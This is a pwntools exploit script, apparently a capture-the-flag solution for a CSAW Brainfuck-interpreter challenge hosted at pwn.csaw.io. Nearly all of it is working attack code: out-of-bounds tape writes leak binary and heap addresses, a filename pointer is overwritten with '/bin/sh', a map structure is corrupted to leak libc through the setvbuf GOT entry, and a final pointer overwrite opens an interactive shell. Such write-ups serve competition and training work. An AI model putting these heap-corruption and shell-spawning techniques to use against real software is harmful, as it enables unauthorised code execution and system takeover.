from pwn import *


r = remote("pwn.csaw.io", 9999)
#r = remote("localhost", 1339)
exe = ELF("./challenge")
libc = ELF("libc.so.6")

# OPTION 1
def send_brainfuck(brainfuck, sql_enable='n'):
    r.sendlineafter(">> ", "1")
    r.sendlineafter(" ? ", sql_enable)
    r.sendlineafter("): ", brainfuck)

def send_brainfuck_input(data):
    for i in data:
        r.sendline(chr(i))

def send_data(data, sql_enable='n'):
    send_brainfuck(",>"*len(data), sql_enable)
    send_brainfuck_input(data.decode())

def advance_pointer(n, sql_enable='n'):
    send_brainfuck(">"*n)

# OPTION 2
def open_existing_bf(id_, data, new="y"):
    r.sendlineafter(">> ", "2")
    r.sendlineafter(">> ", str(id_))
    r.sendlineafter(" ? ", new)
    r.sendlineafter("): ", data)


# it is writing data into 0x55555559f490 which is just before the wildereness
# if its size is larger than 0x10

# Our board (tape) is allocated with 20 characters all zeroes
# Clear means remove the old state reset the datapointer to 0 and clear values.
# it wont breakpoint at put in case we didnt reset because of this:
# while (instructionPointer < program.length())

"""
# important
# gefâ¤  p sizeof(BFTask)
# $24 = 0x88

structs -> chunk size
BFTask -> 0x90
map -> 0x40 

I probably have to corrupt the map and make the index 1 point to a fake tape
address and leak libc.
"""
send_brainfuck("."*0x1) #1
send_brainfuck("."*0x1, "y") #2

#r.recv(4096)
# leak binary from the second BFTask
open_existing_bf(1, ">"*(0xa0 + 1) + ".>"*16, new="n")
data = r.recvline().strip()
bin_leak = u64(data[0:8])
log.info("binary leak @ 0x%x", bin_leak)
exe.address = bin_leak - 0x8318
log.warn("exe base 0x%x", exe.address)

heap_leak = u64(data[8::])
log.info("Heap leak 0x%x", heap_leak)
heap_base = heap_leak - 0x12500
log.info("Heap base 0x%x", heap_base)

# change the pointer of the filename into /bin/sh
open_existing_bf(1,"<"*0x18 + ",>"*8 + ">"*(0x98 + 0x18) + ",>"*8, new="y")
send_brainfuck_input(b"/bin/sh\x00" + p64(heap_leak - 0x148))

# Trying to leak libc by overwriting the vector
open_existing_bf(1, ">"*0xa8 + ",>"*8, new="y")
send_brainfuck_input(p64(exe.got.setvbuf))

# corrupt the map now
open_existing_bf(1, ">"*0x48 + ",>"*8, new="y")
send_brainfuck_input(p64(heap_leak - 0x200 + 0x130))

open_existing_bf(1, ".>"*8, new="y")
libc_leak = u64(r.recvline().strip())
log.info("libc leak 0x%x", libc_leak)
libc.address = libc_leak - libc.sym.setvbuf
log.info("Libc base 0x%x", libc.address)

open_existing_bf(1, ">"*0x200 + ",>"*8, new="y")
send_brainfuck_input(p64(libc.address + 0x55230))
r.sendlineafter(">> ", "3")
r.interactive()

